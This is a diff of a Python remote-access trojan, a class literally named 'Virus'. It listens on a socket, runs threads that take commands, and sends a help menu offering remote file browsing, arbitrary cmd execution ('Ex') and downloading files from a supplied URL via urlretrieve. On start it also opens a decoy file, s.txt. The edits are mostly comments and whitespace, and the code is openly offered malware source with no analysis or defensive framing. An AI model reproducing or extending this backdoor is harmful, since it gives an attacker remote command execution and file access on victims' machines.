@@ -5,14 +5,14 @@ import socketserver
 import _thread
 import time
 from urllib.request import urlretrieve
-import sys
 
 
-print(sys.argv)
 socket_con = socket.socket()
 
-port = 25
-os.system("start "+os.getcwd()+"\s.txt")
+
+port = 25 # Port Number
+
+
 try:
     os.system("start s.txt") # main file 
 except:
@@ -49,6 +49,7 @@ class Virus:
             self.lan_con()
             
         while True:
+            # Thread Part
         
             _thread.start_new_thread(self.get_data_lan , () )
             
@@ -58,10 +59,6 @@ class Virus:
             
             time.sleep(3)            
          
-            
-            
-                #  _thread.start_new_thread(self.show_dir)
-                #  web.run("0.0.0.0",299)
                  
                 
 
@@ -80,14 +77,6 @@ class Virus:
     def download(self):
             
             urlretrieve(self.data[-1],self.data[1])
-    
-    def turn_off():
-        
-        pass
-    
-    def ex_web(self):
-        
-        pass
     
     def lan_con(self):
 
@@ -143,7 +132,9 @@ class Virus:
                 elif self.dir == True:
                     
                     self.httpd.shutdown()
+                    
                     self.show_dir()
+                    
                     self.dir = False
                     
         elif self.data_type == "Download":
@@ -157,13 +148,16 @@ class Virus:
         elif self.data_type == "help" or self.data_type == "Help":
             
             self.con.send("""
+                          
             Close_File (no arg)
             
             ShowFile [directory]
             
             Ex [cmd command]
             
-            Download [savefile and type like (music.mp3)] [url]""".encode())
+            Download [savefile and type like (music.mp3)] [url]
+            
+            """.encode())
               
 
 Virus()
